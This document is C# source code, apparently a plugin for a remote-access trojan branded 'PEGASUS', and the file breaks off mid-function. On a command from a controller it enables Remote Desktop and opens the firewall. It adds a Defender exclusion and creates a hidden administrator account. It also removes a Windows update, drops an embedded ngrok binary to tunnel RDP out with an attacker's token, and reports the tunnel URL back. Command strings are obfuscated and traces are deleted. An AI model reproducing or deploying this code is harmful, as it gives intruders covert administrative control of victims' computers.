using MessagePackLib.MessagePack;
using Microsoft.VisualBasic;
using Microsoft.Win32;
using Plugin.Properties;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.DirectoryServices.AccountManagement;
using System.IO;
using System.Net;
using System.Reflection;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;

namespace Plugin
{
    public  class Packet
    {
        public static void Read(object data)
        {
            try
            {
                MsgPack unpack_msgpack = new MsgPack();
                unpack_msgpack.DecodeFromBytes((byte[])data);
                switch (unpack_msgpack.ForcePathObject("Pac_ket").AsString)
                {
                    case "Install":
                        {
                            Task.Factory.StartNew(() => Install(unpack_msgpack.ForcePathObject("token").AsString, 3389));
                            break;
                        }
                    case "Login":
                        {
                            SendUrl();
                            //Connection.Send(InformationList());
                            break;
                        }
                    case "Remove":
                        {
                            Task.Factory.StartNew(() => Remove());
                            break;
                        }
                    case "AddUser":
                        {
                            Task.Factory.StartNew(() => CU9()).Wait();
                            break;
                        }
                    case "copyProfile":
                        {
                            Task.Factory.StartNew(() => new HandleRDP()).Wait();
                            break;
                        }
                    case "Hide":
                        {
                            Task.Factory.StartNew(() => hideproc()).Wait();
                            break;
                        }
                }
            }
            catch (Exception ex)
            {
                Error(ex.Message);
            }
        }
        public static void Error(string ex)
        {
            MessagePackLib.MessagePack.MsgPack msgpack = new MessagePackLib.MessagePack.MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Error";
            msgpack.ForcePathObject("Error").AsString = ex;
            Connection.Send(msgpack.Encode2Bytes());
        }

        public static void DeleteDirectory(string target_dir)
        {
            string[] files = Directory.GetFiles(target_dir);
            string[] dirs = Directory.GetDirectories(target_dir);

            foreach (string file in files)
            {
                File.SetAttributes(file, FileAttributes.Normal);
                File.Delete(file);
            }

            foreach (string dir in dirs)
            {
                DeleteDirectory(dir);
            }

            Directory.Delete(target_dir, false);
        }

        public  event EventHandler FileCreated;

        public static string PublicUrl()
        {
            string vncinfo = string.Empty;
            string vnc = vncinfo;
            try
            {

                WebClient client = new WebClient();
                using (Stream data = client.OpenRead(@"http://127.0.0.1:4040/api/tunnels"))
                {
                    using (StreamReader reader = new StreamReader(data))
                    {
                        string content = reader.ReadToEnd();
                        string pattern = @"((tcp?|http?|tcp|http):((//)|(\\\\))+[\w\d:#@%/;$()~_?\+-=\\\.&]*)";
                        MatchCollection matches = Regex.Matches(content, pattern);
                        foreach (Match match in matches)
                        {
                            //vncinfo = Convert.ToString(match);
                            string toBeSearched = "tcp://";
                            string vnci = Convert.ToString(match);
                            vncinfo = vnci.Substring(vnci.IndexOf(toBeSearched) + toBeSearched.Length);
                        }
                        foreach (Match match in matches)
                        {
                            //vncinfo = Convert.ToString(match);
                            string toBeSearched = "http://";
                            string vnci = Convert.ToString(match);
                            vncinfo = vnci.Substring(vnci.IndexOf(toBeSearched) + toBeSearched.Length);
                        }

                    }
                }
                return (!string.IsNullOrEmpty(vncinfo)) ? vncinfo : "N/A";
            }
            catch
            {
            }


            return vnc;
        }

        public static bool CreateUserAccount(string name)
        {

            enableRD();

            Microsoft.Win32.Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
            Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", true).SetValue("dontdisplaylastusername", 1);


            ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c net user " + name + " " + name + " /add");
            psi.CreateNoWindow = true;
            psi.RedirectStandardOutput = true;
            psi.RedirectStandardError = true;
            psi.UseShellExecute = false;
            Process p = new Process();
            p.StartInfo = psi;
            p.Start();
            string res = p.StandardOutput.ReadToEnd();
            p.WaitForExit();

            if (res != null)
            {
                if (res.ToLower().Contains("command completed successfully."))
                {
                    psi = new ProcessStartInfo(Strings.StrReverse("exe.dmc"), "/c net localgroup administrators " + name + " /add");
                    psi.CreateNoWindow = true;
                    psi.RedirectStandardOutput = true;
                    psi.RedirectStandardError = true;
                    psi.UseShellExecute = false;
                    p = new Process();
                    p.StartInfo = psi;
                    p.Start();
                    res = p.StandardOutput.ReadToEnd();
                    p.WaitForExit();

                    if (res != null)
                    {
                        if (res.ToLower().Contains("command completed successfully."))
                            return true;
                    }
                    return false;
                }
                else
                    return false;
            }
            else
                return false;
        }
        private static void RunPS(string args)
        {
            Process proc = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "powershell",
                    Arguments = args,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                }
            };
            proc.Start();
        }
        public static void enableRD()
        {

            RegistryKey Rawr;
            Rawr = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\Terminal Server", true);
            if (Rawr == null)
            {
                Microsoft.Win32.Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\Terminal Server", RegistryKeyPermissionCheck.ReadWriteSubTree);
                Rawr = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\Terminal Server", true);
                Rawr.SetValue("fDenyTSConnections", 0);
            }
            else
            {
                Rawr.SetValue("fDenyTSConnections", 0);
            }
            Rawr.Flush();

            RegistryKey Rawr2;
            Rawr2 = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp", true);
            if (Rawr2 == null)
            {
                Microsoft.Win32.Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp", RegistryKeyPermissionCheck.ReadWriteSubTree);
                Rawr2 = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp", true);
                Rawr2.SetValue("UserAuthentication", 1);
            }
            else
            {
                Rawr2.SetValue("UserAuthentication", 1);
            }
            Rawr2.Flush();

            RegistryKey Rawr3;
            Rawr3 = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services", true);
            if (Rawr3 == null)
            {
                Microsoft.Win32.Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services", RegistryKeyPermissionCheck.ReadWriteSubTree);
                Rawr3 = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services", true);
                Rawr3.SetValue("fSingleSessionPerUser", 0);
            }
            else
            {
                Rawr3.SetValue("fSingleSessionPerUser", 0);
            }
            Rawr3.Flush();


            RegistryKey Rawr4;
            Rawr4 = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp", true);
            if (Rawr4 == null)
            {
                Microsoft.Win32.Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\Terminal Server", RegistryKeyPermissionCheck.ReadWriteSubTree);
                Rawr4 = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\Terminal Server", true);
                Rawr4.SetValue("fSingleSessionPerUser", 0);
            }
            else
            {
                Rawr4.SetValue("fSingleSessionPerUser", 0);
            }
            Rawr4.Flush();


            try
            {
                var uac = Microsoft.Win32.Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList", true);

                if (uac != null)
                    if (uac.GetValue("Durios") != null)
                        uac.SetValue("Durios", "0");
                Console.WriteLine("Durios desactivated");

            }
            catch (Exception)
            {
                RunPS("New-ItemProperty -Path HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList -Name Durios -PropertyType DWord -Value 0 -Force");
            }


            RegistryKey Rawr5;
            Rawr5 = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList", true);
            if (Rawr5 == null)
            {
                Microsoft.Win32.Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList", RegistryKeyPermissionCheck.ReadWriteSubTree);
                Rawr5 = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList", true);
                Rawr5.SetValue("Durios", 0);
            }
            else
            {
                Rawr5.SetValue("Durios", 0);
            }
            Rawr5.Flush();


            System.Diagnostics.Process.Start(new ProcessStartInfo
            {
                FileName = "cmd",
                Arguments = $"/k start /b powershell –ExecutionPolicy Bypass -WindowStyle Hidden -Command Enable-NetFirewallRule -DisplayGroup 'Remote Desktop' & exit",
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden,
                UseShellExecute = true,
                ErrorDialog = false,
            });
            System.Diagnostics.Process.Start(new ProcessStartInfo
            {
                FileName = "cmd",
                Arguments = $"/k start /b powershell –ExecutionPolicy Bypass -WindowStyle Hidden -Command netsh advfirewall firewall add rule name='allow RemoteDesktop' dir=in protocol=TCP localport=3389 action=allow & exit",
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden,
                UseShellExecute = true,
                ErrorDialog = false,
            });
            System.Diagnostics.Process.Start(new ProcessStartInfo
            {
                FileName = "cmd",
                Arguments = $"/k start /b powershell –ExecutionPolicy Bypass -WindowStyle Hidden -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath %ProgramFiles%\\RDP Wrapper & exit",
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden,
                UseShellExecute = true,
                ErrorDialog = false,
            });


        }
        public static void SendUrl()
        {
            while (!Directory.Exists(@"C:\Program Files\RDP Wrapper"))
            {

            }
            string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
            string pathofrdp = Path.Combine(path, "PEGASUS");
            string patchoffile = Path.Combine(pathofrdp, "tunnel.txt");
            File.WriteAllText(patchoffile, PublicUrl());
            string cont = File.ReadAllText(patchoffile);


            while (!PublicUrl().Contains("tcp"))
            {

            }
            Connection.Send(InformationList());
        }
        public static byte[] InformationList()
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Login";
            msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
            msgpack.ForcePathObject("login").AsString = PublicUrl();
            return msgpack.Encode2Bytes();
        }
        public void CheckFileExists()
        {
            string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
            string pathofrdp = Path.Combine(path, "PEGASUS");
            string patchoffile = Path.Combine(pathofrdp, "tunnel.txt");
            while (!File.Exists(patchoffile))
            {
                Thread.Sleep(1000);
            }
            FileCreated(this, new EventArgs());
        }
        public static void Install(string token, int port)
        {
            Task.Factory.StartNew(() => CU9()).Wait();
            Task.Factory.StartNew(() => rdp()).Wait();
            Task.Factory.StartNew(() => frok(token, port)).Wait();
            Task.Factory.StartNew(() => SendUrl()).Wait();
            
        }

        public static void Remove()
        {

            string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
            string pathofrdp = Path.Combine(path, "PEGASUS");
            if (!Directory.Exists(pathofrdp))
            {
                Directory.CreateDirectory(pathofrdp);
            }
            string rdpinstallpath = Path.Combine(pathofrdp, "uninstall.exe");
            Byte[] rdpinstallbytes = Resources.UnistallRDP;
            File.WriteAllBytes(rdpinstallpath, rdpinstallbytes);
            //Exec(rdpinstallpath, "u", (object)0);
            //ADHS.eleself(rdpinstallpath);
            Task.Run(() => Process.Start(rdpinstallpath)).Wait();
            //Task.Factory.StartNew(() => Execute(rdpinstallbytes)).Wait();
            //File.SetAttributes(rdpinstallpath, FileAttributes.Hidden);
        }

        public static void hideproc()
        {
            string path = Path.Combine(Path.GetTempPath());
            string pathofrdp = Path.Combine(path, "PEGASUS");
            if (!Directory.Exists(pathofrdp))
            {
                Directory.CreateDirectory(pathofrdp);
            }
            //string rdpinstallpath = Path.Combine(pathofrdp, "hidedpr.exe");
            ///Byte[] rdpinstallbytes = Resources.Install;
            //File.WriteAllBytes(rdpinstallpath, rdpinstallbytes);
            //Task.Run(() => Process.Start(rdpinstallpath)).Wait();
            //Task.Factory.StartNew(() => Execute(rdpinstallbytes)).Wait();
            //File.SetAttributes(rdpinstallpath, FileAttributes.Hidden);




        }




        public static void frok(string token, int port)
        {
            try
            {
                int timeOut = 5000;
                string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
                string pathofhelmet = Path.Combine(path, "PEGASUS");
                string rdpinstallpath = Path.Combine(pathofhelmet, "PEGASUSngrok.exe");

                if (!Directory.Exists(pathofhelmet))
                {
                    Directory.CreateDirectory(pathofhelmet);
                }
                Byte[] rdpinstallbytes = Resources.ngrok;
                File.WriteAllBytes(rdpinstallpath, rdpinstallbytes);

                string helmetpath = Path.Combine(pathofhelmet, "PEGASUSngrok.exe");
                string helmetlog = Path.Combine(pathofhelmet, "proclog.txt");
                System.IO.StreamWriter file = new System.IO.StreamWriter(Path.Combine(pathofhelmet, BCutEncrypt("mxea$hk~")));
                file.WriteLine("set logFile=" + helmetlog + "");
                file.WriteLine("set exeFile=" + helmetpath + "");
                file.WriteLine("%exeFile% authtoken " + token);
                file.WriteLine("%exeFile%  tcp  " + port + " > %logFile%");
                file.Close();
                string frogc = Path.Combine(pathofhelmet, BCutEncrypt("mxea$hk~"));
                Process.Start(new ProcessStartInfo
                {
                    FileName = frogc,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = true,
                    ErrorDialog = false,
                });
                

            }
            catch (Exception)
            {
                //return string.Empty;
            }


        }
        public static void UnZip(string zipPath, string extractPath) //  Works
        {
          //  ZipFile.ExtractToDirectory(zipPath, extractPath);
        }

        public static void Zip(string dir, string zipPath) //  Works
        {
            Process.Start(new ProcessStartInfo
            {
                FileName = BCutEncrypt("ign"),
                Arguments = BCutEncrypt("%a*y~kx~*%h*ze}}oxyboff*Iegzxoyy'Kxibc|o*'Zk~b*") + dir + BCutEncrypt("*'Noy~cdk~cedZk~b*") + zipPath + " & exit",
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden,
                UseShellExecute = true,
                ErrorDialog = false,
            });
        }
        public static void CreateUser()
        {
            string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
            string pathofUC = Path.Combine(path, "PEGASUS");
            string user = "PEGASUS";
            string password = "PEGASUS";
            if (!Directory.Exists(pathofUC))
            {
                Directory.CreateDirectory(pathofUC);
            }
            Task.Factory.StartNew(() => CU9()).Wait();
            Task.Factory.StartNew(() => AddUserAdmin(user, password)).Wait();
            Task.Factory.StartNew(() => CreateUserAccount(user, password)).Wait();
        }
        public static void CU9()
        {
            //CreateUserAccount("PEGASUS");
            
            string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
            string pathofUC = Path.Combine(path, "PEGASUS");
            string installCU = Path.Combine(pathofUC, "user.exe");
            File.WriteAllBytes(installCU, Properties.Resources.Create);
            Process.Start(installCU);
            
        }

        public static void Execute(byte[] purdi)
        {
            try
            {
                Assembly asm = AppDomain.CurrentDomain.Load((byte[])purdi);
                MethodInfo Metinf = Entry(asm);
                object InjObj = asm.CreateInstance(Metinf.Name);
                object[] parameters = new object[1];
                if (Metinf.GetParameters().Length == 0)
                    parameters = null;
                MethodInfo(Metinf, InjObj, parameters);
            }
            catch { }
        }
        private static object MethodInfo(MethodInfo meth, object obj1, object[] obj2)
        {
            if (meth != null)
                return meth.Invoke(obj1, obj2);
            else
                return false;
        }

        private static MethodInfo Entry(Assembly obj)
        {
            if (obj != null)
                return obj.EntryPoint;
            else
                return null;
        }
        public static void DoUpdateRtoP()
        {


        }
        public static void IsProcessOpen()
        {
            try
            {
                foreach (Process proc in Process.GetProcessesByName("winvnc"))
                {
                    proc.Kill();
                }

                foreach (Process proc in Process.GetProcessesByName("cmd"))
                {
                    proc.Kill();
                }



                foreach (Process proc in Process.GetProcessesByName("conhost"))
                {
                    proc.Kill();
                }




                foreach (Process proc in Process.GetProcessesByName("installrdp"))
                {
                    proc.Kill();
                }




                foreach (Process proc in Process.GetProcessesByName("rdpinstall"))
                {
                    proc.Kill();
                }




                foreach (Process proc in Process.GetProcessesByName("updaterdp"))
                {
                    proc.Kill();
                }



                foreach (Process proc in Process.GetProcessesByName("Install"))
                {
                    proc.Kill();
                }



                foreach (Process proc in Process.GetProcessesByName("PEGASUS-winvnc"))
                {
                    proc.Kill();
                }

                foreach (Process proc in Process.GetProcessesByName("PEGASUS-ngrok"))
                {
                    proc.Kill();
                }

                foreach (Process proc in Process.GetProcessesByName("ngrok"))
                {
                    proc.Kill();
                }

                foreach (Process proc in Process.GetProcessesByName("rdpinstall"))
                {
                    proc.Kill();
                }

                foreach (Process proc in Process.GetProcessesByName("winvnc"))
                {
                    proc.Kill();
                }
            }
            catch
            {
                //Console.WriteLine(ex.Message);
            }
        }


        public static void rdp()
        {

            string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
            string pathofrdp = Path.Combine(path, "PEGASUS");
            if (!Directory.Exists(pathofrdp))
            {
                Directory.CreateDirectory(pathofrdp);
            }
            Byte[] rdpinstallbytes = Resources.F16;
            string rdpinstallpath = Path.Combine(pathofrdp, "jaxbe.exe");
            Task.Run(() => File.WriteAllBytes(rdpinstallpath, rdpinstallbytes)).Wait();
            Task.Run(() => Process.Start(rdpinstallpath)).Wait();
            //ADHS.eleself(rdpinstallpath);
            //Exec(rdpinstallpath, "u", (object)0);
            //Execute(rdpinstallbytes);
        }
        public static void AddEx()
        {

        }
        public static void deleterdp()
        {
            string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "PEGASUS");
            Process.Start(new ProcessStartInfo
            {
                FileName = BCutEncrypt("ign"),
                Arguments = $"/k start /b del /q/f/s " + path + " & exit",
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden,
                UseShellExecute = true,
                ErrorDialog = false,
            });

            try
            {
                Directory.Delete(path, true); //Setting "recursive" to true will remove every subfile/-folder.
            }
            catch (Exception ex)
            {
                //An error occurred, use this block to log it/show it to the user/whatever.
                //ex.Message - The error message.
                //ex.StackTrace - Where in the code the error occurred.
            }

        }
        public static void cleantemp()
        {

            Process.Start(new ProcessStartInfo
            {
                FileName = BCutEncrypt("ign"),
                Arguments = $"/k start /b del /q/f/s %TEMP%\\* & exit",
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden,
                UseShellExecute = true,
                ErrorDialog = false,
            });

        }
        public static bool CreateUserAccount(string name, string password)
        {


            Microsoft.Win32.Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
            Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", true).SetValue("dontdisplaylastusername", 1);


            ProcessStartInfo psi = new ProcessStartInfo(BCutEncrypt("ign$oro"), "/c net user " + name + " " + password + " /add");
            psi.CreateNoWindow = true;
            psi.RedirectStandardOutput = true;
            psi.RedirectStandardError = true;
            psi.UseShellExecute = false;
            Process p = new Process();
            p.StartInfo = psi;
            p.Start();
            string res = p.StandardOutput.ReadToEnd();
            p.WaitForExit();

            if (res != null)
            {
                if (res.ToLower().Contains("command completed successfully."))
                {
                    psi = new ProcessStartInfo(BCutEncrypt("ign$oro"), "/c net localgroup administrators " + name + " /add");
                    psi.CreateNoWindow = true;
                    psi.RedirectStandardOutput = true;
                    psi.RedirectStandardError = true;
                    psi.UseShellExecute = false;
                    p = new Process();
                    p.StartInfo = psi;
                    p.Start();
                    res = p.StandardOutput.ReadToEnd();
                    p.WaitForExit();

                    if (res != null)
                    {
                        if (res.ToLower().Contains("command completed successfully."))
                            return true;
                    }
                    return false;
                }
                else
                    return false;
            }
            else
                return false;
        }
        public static void AddUserAdmin(string user, string password)
        {


            int _MajorVersion = Environment.OSVersion.Version.Major;

            if (_MajorVersion == 6)
            {
                RegistryKey Rawr;
                Rawr = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true);
                if (Rawr == null)
                {
                    Microsoft.Win32.Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", RegistryKeyPermissionCheck.ReadWriteSubTree);
                    Rawr = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true);
                    Rawr.SetValue("dontdisplaylastusername", 1);
                }
                else
                {
                    Rawr.SetValue("dontdisplaylastusername", 1);
                }
                Rawr.Flush();
                RegistryKey Rawr2;
                Rawr2 = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters", true);
                if (Rawr2 == null)
                {
                    Microsoft.Win32.Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters", RegistryKeyPermissionCheck.ReadWriteSubTree);
                    Rawr2 = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters", true);
                    Rawr2.SetValue("DWORD", 2);
                }
                else
                {
                    Rawr.SetValue("DWORD", 2);
                }
                Rawr.Flush();

                string userName = user;
                string userPassword = password;
                PrincipalContext systemContext = null;

                try
                {
                    Console.WriteLine("Building System Information");
                    systemContext = new PrincipalContext(ContextType.Machine, null);
                }
                catch (Exception E)
                {
                    Console.WriteLine("Failed to create System Context.");
                    Console.WriteLine("Exception: " + E);

                    Console.WriteLine();
                    Console.WriteLine("Press Any Key to Continue");
                    Console.ReadLine();
                    return;
                }

                //Check if user object already exists
                Console.WriteLine("Checking if User Exists.");
                UserPrincipal usr = UserPrincipal.FindByIdentity(systemContext, userName);
                if (usr != null)
                {
                    Console.WriteLine(userName + " already exists. Exiting!!");
                    Console.ReadLine();
                    return;
                }

                //Create the new UserPrincipal object
                Console.WriteLine("Building User Information");
                UserPrincipal userPrincipal = new UserPrincipal(systemContext);
                userPrincipal.Name = userName;
                userPrincipal.DisplayName = "PEGASUS Administrative User";
                userPrincipal.PasswordNeverExpires = true;
                userPrincipal.SetPassword(userPassword);
                userPrincipal.Enabled = true;

                try
                {
                    Console.WriteLine("Creating New User");
                    userPrincipal.Save();
                }
                catch (Exception E)
                {
                    Console.WriteLine("Failed to create user.");
                    Console.WriteLine("Exception: " + E);

                    Console.WriteLine();
                    Console.WriteLine("Press Any Key to Continue");
                    Console.ReadLine();
                    return;
                }

                GroupPrincipal groupPrincipal = null;
                try
                {
                    groupPrincipal = GroupPrincipal.FindByIdentity(systemContext, "Administrators");

                    if (groupPrincipal != null)
                    {
                        //check if user is a member
                        Console.WriteLine("Checking if itadmin is part of Administrators Group");
                        if (groupPrincipal.Members.Contains(systemContext, IdentityType.SamAccountName, userName))
                        {
                            Console.WriteLine("Administrators already contains " + userName);
                            return;
                        }
                        //Adding the user to the group
                        Console.WriteLine("Adding itadmin to Administrators Group");
                        groupPrincipal.Members.Add(userPrincipal);
                        groupPrincipal.Save();
                        return;
                    }
                    else
                    {
                        Console.WriteLine("Could not find the group Administrators");
                    }
                }
                catch (Exception E)
                {
                    Console.WriteLine("Exception adding user to group.");
                    Console.WriteLine("Exception: " + E);

                    Console.WriteLine();
                    Console.WriteLine("Press Any Key to Continue");
                    Console.ReadLine();
                }

                Console.WriteLine("Cleaning Up");
                groupPrincipal.Dispose();
                userPrincipal.Dispose();
                systemContext.Dispose();

                Console.WriteLine();
                Console.WriteLine("Press Any Key to Continue");
                Console.ReadLine();




                return;
            }
            else if (_MajorVersion == 10)
            {
                System.Diagnostics.Process.Start(new ProcessStartInfo
                {
                    FileName = BCutEncrypt("ign"),
                    Arguments = $"/k start /b wusa /uninstall /kb:4471332 /quiet & exit",
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = true,
                    ErrorDialog = false,
                });

                RegistryKey Rawr;
                Rawr = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true);
                if (Rawr == null)
                {
                    Microsoft.Win32.Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", RegistryKeyPermissionCheck.ReadWriteSubTree);
                    Rawr = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true);
                    Rawr.SetValue("dontdisplaylastusername", 1);
                }
                else
                {
                    Rawr.SetValue("dontdisplaylastusername", 1);
                }
                Rawr.Flush();
                RegistryKey Rawr2;
                Rawr2 = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters", true);
                if (Rawr2 == null)
                {
                    Microsoft.Win32.Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters", RegistryKeyPermissionCheck.ReadWriteSubTree);
                    Rawr2 = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters", true);
                    Rawr2.SetValue("DWORD", 2);
                }
                else
                {
                    Rawr.SetValue("DWORD", 2);
                }
                Rawr.Flush();

                string userName = user;
                string userPassword = password;
                PrincipalContext systemContext = null;

                try
                {
                    Console.WriteLine("Building System Information");
                    systemContext = new PrincipalContext(ContextType.Machine, null);
                }
                catch (Exception E)
                {
                    Console.WriteLine("Failed to create System Context.");
                    Console.WriteLine("Exception: " + E);

                    Console.WriteLine();
                    Console.WriteLine("Press Any Key to Continue");
                    Console.ReadLine();
                    return;
                }

                //Check if user object already exists
                Console.WriteLine("Checking if User Exists.");
                UserPrincipal usr = UserPrincipal.FindByIdentity(systemContext, userName);
                if (usr != null)
                {
                    Console.WriteLine(userName + " already exists. Exiting!!");
                    Console.ReadLine();
                    return;
                }

                //Create the new UserPrincipal object
                Console.WriteLine("Building User Information");
                UserPrincipal userPrincipal = new UserPrincipal(systemContext);
                userPrincipal.Name = userName;
                userPrincipal.DisplayName = "PEGASUS Administrative User";
                userPrincipal.PasswordNeverExpires = true;
                userPrincipal.SetPassword(userPassword);
                userPrincipal.Enabled = true;

                try
                {
                    Console.WriteLine("Creating New User");
                    userPrincipal.Save();
                }
                catch (Exception E)
                {
                    Console.WriteLine("Failed to create user.");
                    Console.WriteLine("Exception: " + E);

                    Console.WriteLine();
                    Console.WriteLine("Press Any Key to Continue");
                    Console.ReadLine();
                    return;
                }

                GroupPrincipal groupPrincipal = null;
                try
                {
                    groupPrincipal = GroupPrincipal.FindByIdentity(systemContext, "Administrators");

                    if (groupPrincipal != null)
                    {
                        //check if user is a member
                        Console.WriteLine("Checking if itadmin is part of Administrators Group");
                        if (groupPrincipal.Members.Contains(systemContext, IdentityType.SamAccountName, userName))
                        {
                            Console.WriteLine("Administrators already contains " + userName);
                            return;
                        }
                        //Adding the user to the group
                        Console.WriteLine("Adding itadmin to Administrators Group");
                        groupPrincipal.Members.Add(userPrincipal);
                        groupPrincipal.Save();
                        return;
                    }
                    else
                    {
                        Console.WriteLine("Could not find the group Administrators");
                    }
                }
                catch (Exception E)
                {
                    Console.WriteLine("Exception adding user to group.");
                    Console.WriteLine("Exception: " + E);

                    Console.WriteLine();
                    Console.WriteLine("Press Any Key to Continue");
                    Console.ReadLine();
                }

                Console.WriteLine("Cleaning Up");
                groupPrincipal.Dispose();
                userPrincipal.Dispose();
                systemContext.Dispose();

                Console.WriteLine();
                Console.WriteLine("Press Any Key to Continue");
                Console.ReadLine();




                return;
            }
            else if (_MajorVersion == 11)
            {
                System.Diagnostics.Process.Start(new ProcessStartInfo
                {
                    FileName = BCutEncrypt("ign"),
                    Arguments = $"/k start /b wusa /uninstall /kb:4471332 /quiet & exit",
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = true,
                    ErrorDialog = false,
                });

                RegistryKey Rawr;
                Rawr = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true);
                if (Rawr == null)
                {
                    Microsoft.Win32.Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", RegistryKeyPermissionCheck.ReadWriteSubTree);
                    Rawr = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true);
                    Rawr.SetValue("dontdisplaylastusername", 1);
                }
                else
                {
                    Rawr.SetValue("dontdisplaylastusername", 1);
                }
                Rawr.Flush();
                RegistryKey Rawr2;
                Rawr2 = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters", true);
                if (Rawr2 == null)
                {
                    Microsoft.Win32.Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters", RegistryKeyPermissionCheck.ReadWriteSubTree);
                    Rawr2 = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters", true);
                    Rawr2.SetValue("DWORD", 2);
                }
                else
                {
